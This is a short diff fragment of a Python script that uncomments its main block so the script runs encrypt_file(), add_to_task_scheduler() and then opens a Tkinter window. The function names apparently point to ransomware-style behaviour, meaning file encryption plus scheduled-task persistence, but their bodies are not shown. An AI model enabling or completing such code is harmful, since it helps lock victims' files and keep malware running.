@@ -129,7 +129,7 @@ def encrypt_file():
 
 
 
-#if __name__ == "__main__":
+if __name__ == "__main__":
     encrypt_file()
     add_to_task_scheduler()
     root = tk.Tk()
